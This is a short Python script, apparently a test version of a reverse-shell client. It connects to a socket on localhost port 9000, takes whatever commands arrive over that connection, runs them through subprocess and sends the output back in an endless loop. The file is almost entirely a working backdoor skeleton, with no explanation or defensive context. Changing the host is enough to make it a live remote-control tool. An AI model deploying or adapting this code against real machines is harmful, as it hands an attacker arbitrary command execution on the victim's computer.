import socket
import subprocess

def init_client():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 9000)) # test on localhost

        while True: 
            cmd = s.recv(1024).decode()
            cmd_args = cmd.split()

            output = subprocess.run(cmd_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            s.send(output.stdout)

    except Exception as err:
        print('There was a problem with the connection', err)

init_client()